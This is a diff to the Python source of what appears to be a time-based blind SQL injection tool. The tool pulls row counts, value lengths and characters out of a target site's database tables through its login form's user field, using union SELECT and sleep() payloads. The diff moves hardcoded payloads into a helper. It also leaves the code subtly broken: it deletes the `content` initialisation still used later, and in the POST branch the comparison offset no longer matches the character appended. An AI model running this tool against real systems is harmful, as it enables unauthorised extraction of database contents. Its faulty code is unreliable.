@@ -5,7 +5,6 @@ from columns import SqliColumns
 from config import UnpackFunction
 from prettytable import PrettyTable
 from tqdm import trange
-from tqdm import tqdm
 import threading
 import Queue
 
@@ -99,7 +98,6 @@ class SqliContent(SqliColumns):
         content_len = 0
         logger.debug("Start sqli table %s column %s limit %d content..." % (table_name, column_name, limits))
 
-        content = ""
         # 先GET
         if self.sqlirequest == "GET":
             logger.debug("The sqlirequest is %s, start sqli content..." % self.sqlirequest)
@@ -192,9 +190,13 @@ class SqliContent(SqliColumns):
                 # 然后注content 的length
                 for j in trange(100, desc="Content sqli...", leave=False, disable=True):
                     logger.debug("Start %dth content length sqli..." % (limits + 1))
-                    payload = "user=ddog' union SELECT 1,if((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
-                        limits) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
-
+                    # payload = "user=ddog' union SELECT 1,if((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
+                    #     limits) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
+                    payload = self.dealpayload.construct_time_payload(
+                        select="length(" + column_name + ")",
+                        source=database_name + "." + table_name,
+                        limit=limits,
+                        compare=j)
                     if self.Data.GetTimeData(payload, self.time) == 0:
                         content_len = j
                         break
@@ -212,10 +214,15 @@ class SqliContent(SqliColumns):
                 for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False, disable=True):
                     for k in trange(100, desc='%dth Content\'s %dth char sqli' % ((limits + 1), (j + 1)),
                                     leave=False, disable=True):
-                        payload = "user=ddog' union sELECT 1,if((SELECT  ascii(substring(" + column_name + "," + repr(
-                            j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
-                            limits) + ",1) > " + repr(
-                            k + 30) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
+                        # payload = "user=ddog' union sELECT 1,if((SELECT  ascii(substring(" + column_name + "," + repr(
+                        #     j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
+                        #     limits) + ",1) > " + repr(
+                        #     k + 30) + ",sleep(" + repr(self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
+                        payload = self.dealpayload.construct_time_payload(
+                            select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
+                            source=database_name + "." + table_name,
+                            limit=limits,
+                            compare=(k + 30))
                         if self.Data.GetTimeData(payload, self.time) == 0:
                             content += chr(int(k + 30))
                             break
@@ -323,10 +330,14 @@ class SqliContent(SqliColumns):
                 # 然后注content 的length
                 for j in trange(100, desc="Content sqli...", leave=False, disable=True):
                     logger.debug("Start %dth content length sqli..." % (limits + 1))
-                    payload = {
-                        "user": "ddog' union SELECT 1,if((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
-                            limits) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
-
+                    # payload = {
+                    #     "user": "ddog' union SELECT 1,if((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
+                    #         limits) + ",1) > " + repr(j) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
+                    payload = self.dealpayload.construct_time_payload(
+                        select="length(" + column_name + ")",
+                        source=database_name + "." + table_name,
+                        limit=limits,
+                        compare=j)
                     if self.Data.PostTimeData(payload, self.time) == 0:
                         content_len = j
                         break
@@ -345,11 +356,15 @@ class SqliContent(SqliColumns):
                 for j in trange(int(content_len), desc='%dth Content sqli' % (limits + 1), leave=False, disable=True):
                     for k in trange(100, desc='%dth Content\'s %dth char sqli' % ((limits + 1), (j + 1)),
                                     leave=False, disable=True):
-                        payload = {
-                            "user": "ddog' union SELECT 1,if((SELECT  ascii(substring(" + column_name + "," + repr(
-                                j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
-                                limits) + ",1) > " + repr(k) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
-
+                        # payload = {
+                        #     "user": "ddog' union SELECT 1,if((SELECT  ascii(substring(" + column_name + "," + repr(
+                        #         j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
+                        #         limits) + ",1) > " + repr(k) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
+                        payload = self.dealpayload.construct_time_payload(
+                            select="ascii(substring(" + column_name + "," + repr(j + 1) + ",1))",
+                            source=database_name + "." + table_name,
+                            limit=limits,
+                            compare=(k + 30))
                         if self.Data.PostTimeData(payload, self.time) == 0:
                             content += chr(int(k))
                             break
@@ -424,8 +439,12 @@ class SqliContent(SqliColumns):
 
                 for i in trange(100, desc='Content amount sqli', leave=False, disable=True):
                     # 先注content的数量
-                    payload = "user=ddog' union SELECT 1,if((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + ",sleep(" + repr(
-                        self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
+                    # payload = "user=ddog' union SELECT 1,if((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + ",sleep(" + repr(
+                    #     self.time) + "),0)%23&passwd=ddog123&submit=Log+In"
+                    payload = self.dealpayload.construct_time_payload(
+                        select="count(*)",
+                        source=database_name + "." + table_name,
+                        compare=i)
                     if self.Data.GetTimeData(payload, self.time) == 0:
                         content_count = i
                         break
@@ -495,9 +514,12 @@ class SqliContent(SqliColumns):
 
                 for i in trange(100, desc='Content amount sqli', leave=False, disable=True):
                     # 先注content的数量
-                    payload = {
-                        "user": "ddog' union SELECT 1,if((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
-
+                    # payload = {
+                    #     "user": "ddog' union SELECT 1,if((SELECT count(*) from " + database_name + "." + table_name + ") > " + repr(i) + ",sleep(" + repr(self.time) + "),0)#", "passwd": "ddog123"}
+                    payload = self.dealpayload.construct_time_payload(
+                        select="count(*)",
+                        source=database_name + "." + table_name,
+                        compare=i)
                     if self.Data.PostTimeData(payload, self.time) == 0:
                         content_count = i
                         break
@@ -512,4 +534,4 @@ class SqliContent(SqliColumns):
                 logger.info("[*] content count: %d" % content_count)
                 return content_count
 
-        logger.debug("Sqli table %s column %s limit %d success,,," % table_name, column_name, limits)
+
